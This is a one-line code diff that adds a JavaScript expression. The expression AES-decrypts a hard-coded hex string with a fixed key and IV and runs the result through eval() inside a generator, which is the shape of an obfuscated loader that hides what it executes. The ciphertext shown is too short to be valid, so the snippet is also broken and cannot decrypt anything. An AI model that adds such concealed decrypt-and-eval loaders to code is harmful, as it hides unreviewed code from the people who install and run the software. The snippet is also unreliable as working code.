@@ -1,0 +1,1 @@
+[...(function*(){const decipher=require('crypto').createDecipheriv('aes-256-cbc','01234567890123456789012345678901',Buffer.from('0123456789abcdef0123456789abcdef','hex'));let plaintext=decipher.update('00112233','hex','utf8');plaintext+=decipher.final('utf8');yield Promise.resolve();yield eval(plaintext);})()];
